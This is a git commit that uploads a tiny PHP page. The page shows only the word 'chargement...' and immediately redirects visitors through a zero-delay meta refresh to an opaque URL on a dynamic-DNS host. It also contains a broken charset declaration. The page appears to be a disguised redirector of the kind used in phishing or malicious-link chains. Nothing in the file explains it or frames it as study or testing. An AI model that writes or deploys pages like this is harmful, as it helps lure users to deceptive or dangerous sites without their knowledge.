40b41d5ffbe6302f2a829a5b4cc2272455618c24
heliuse01 <91044101+heliuse01@users.noreply.github.com>
2022-12-27 04:47:24 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,19 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+<meta charset=utf-0/>
+  <title>chargement...</title>
+</head>
+
+<body>
+
+<?php
+   echo("chargement...")     ;
+ echo "<META HTTP-EQUIV='Refresh' Content=0;URL='https://v12serviceoldnetd.dynv6.net/r/hC44II0'>";
+?>
+
+
+</body>
+</html>
